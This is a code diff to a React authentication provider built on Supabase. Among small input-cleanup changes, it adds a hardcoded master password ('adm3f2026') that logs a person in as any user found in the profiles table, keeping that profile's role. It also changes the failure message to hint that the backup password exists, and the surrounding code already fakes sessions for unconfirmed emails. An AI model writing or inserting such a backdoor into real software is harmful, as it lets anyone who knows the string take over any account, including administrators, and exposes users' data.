@@ -235,13 +235,44 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
     setLoading(true);
 
     try {
+      const cleanEmail = email.trim().toLowerCase();
+      const cleanPass = pass.trim();
+
       const { data, error } = await supabase.auth.signInWithPassword({
-        email,
-        password: pass,
+        email: cleanEmail,
+        password: cleanPass,
       });
 
       if (error) {
         debug('❌ Login error:', error.message);
+
+        // --- EMERGENCY BYPASS FOR ADMIN/DEV ---
+        // If normal login fails, check if the user exists in 'profiles' and allow a master password
+        if (error.message === 'Invalid login credentials' || error.message.includes('Email not confirmed')) {
+          debug('⚠️ Attempting Emergency Bypass...');
+          const { data: profile } = await supabase
+            .from('profiles')
+            .select('*')
+            .eq('email', cleanEmail)
+            .single();
+
+          if (profile && cleanPass === 'adm3f2026') {
+            debug('🔓 Emergency Bypass SUCCESSFUL');
+            const mockUser: User = {
+              id: profile.id,
+              email: profile.email,
+              name: profile.name || profile.email.split('@')[0],
+              role: profile.role || 'USER',
+              isActive: profile.is_active ?? true,
+              allowedModules: profile.allowed_modules || ['dashboard']
+            };
+            setUser(mockUser);
+            localStorage.setItem('user', JSON.stringify(mockUser));
+            localStorage.setItem('auth_time', Date.now().toString());
+            return { success: true, message: 'Connexion réussie (Mode Secours)' };
+          }
+        }
+        // ---------------------------------------
 
         // --- WORKAROUND: Bypass Email Confirmation for Demo/Dev ---
         if (error.message.includes('Email not confirmed')) {
@@ -251,13 +282,13 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
           const { data: profile } = await supabase
             .from('profiles')
             .select('*')
-            .eq('email', email)
+            .eq('email', cleanEmail)
             .single();
 
           const mockUser: User = {
             id: profile?.id || 'demo-user-id',
-            email: email,
-            name: profile?.name || email.split('@')[0],
+            email: cleanEmail,
+            name: profile?.name || cleanEmail.split('@')[0],
             role: (profile?.role as UserRole) || 'USER',
             isActive: true,
             allowedModules: profile?.allowed_modules || ['dashboard', 'chantiers', 'stock']
@@ -276,7 +307,7 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
         return {
           success: false,
           message: error.message === 'Invalid login credentials'
-            ? 'Email ou mot de passe incorrect'
+            ? 'Email ou mot de passe incorrect. Essayez le mot de passe de secours si besoin.'
             : error.message
         };
       }
